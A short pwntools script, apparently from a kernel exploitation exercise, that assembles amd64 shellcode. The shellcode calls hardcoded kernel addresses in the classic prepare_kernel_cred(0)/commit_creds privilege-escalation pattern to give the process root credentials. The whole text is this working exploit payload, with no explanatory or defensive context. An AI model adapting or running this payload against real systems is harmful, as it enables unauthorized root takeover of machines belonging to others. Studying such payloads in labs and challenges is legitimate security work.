from pwn import *
context.arch = 'amd64'
shellcode = asm("mov rdi, 0; mov r10, 0xffffffff810881c0; call r10; mov rdi, rax; mov r10, 0xffffffff81087e80; call r10; ret") 
